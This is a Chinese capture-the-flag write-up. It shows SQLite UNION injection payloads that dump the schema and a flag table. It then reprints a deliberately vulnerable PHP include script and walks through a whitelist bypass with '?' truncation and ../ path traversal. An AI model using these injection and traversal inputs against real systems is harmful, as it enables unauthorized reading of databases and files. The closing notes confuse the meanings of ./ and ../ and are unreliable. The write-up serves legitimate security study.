1.sql注入
-
```
1' order by 2; 两列
```
```
1' union select 1,2;  注入点在第二列
```
![image](https://github.com/xhsy0314/Task/assets/84487619/eb055036-2882-4638-b338-405d6c2e1b38)

```
1' union select 1,group_concat(sql) from sqlite_master;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/50ffb106-0610-46c8-a8e1-0b9ea4db5493)

```
-1' union select 1,group_concat(flaaag) from flaaaaa_aag;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/67694d40-feb4-411a-8b83-9fc80e74ea8a)


2.php
-

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
```

查看源码，有个hint.php访问一下<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/b4e0d62c-591b-4e42-ac93-24fd0e8ad0ac)
<br>
最底部的if语句为执行条件，有三个条件，第一个判断文件不能为空（检查是否传了file参数），第二这个传的参数是字符串，第三要过白名单检测，过了之后包含 隐藏了flag的文件。我们再看上面的if语句，白名单是hint.php，又有mb_strpos和mb_substr截取内容，碰到？就截止，所以我们只需要输入 source.php?file=source.php?即可绕过白名单检测，然后在输入../逐级跳转目录读取flag即可，可以一个一个试,多试几次则找到了flag<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/e62557ea-d228-4f27-a162-0d282f0cb135)
<br>
知识点:

* empty() 函数用于检查一个变量是否为空。
* empty() 判断一个变量是否被认为是空的。当一个变量并不存在，或者它 的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。
* empty() 5.5 版本之后支持表达式了，而不仅仅是变量。

* mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。
注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。

* mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置(即数字)

* .表示当前目录
* . .表示当前目录的上一级目录。
* . ./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定
* ./表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。
* 例如：
        文件夹 a
        下面有 文件夹b c 和文件 d。
        文件夹b下面有e.php 和文件f。
        则e中的 . 表示 文件夹b
        ./f 表示b下面的文件f。
        . .表示a文件夹。
        . ./d 表示a文件夹下的d文件。


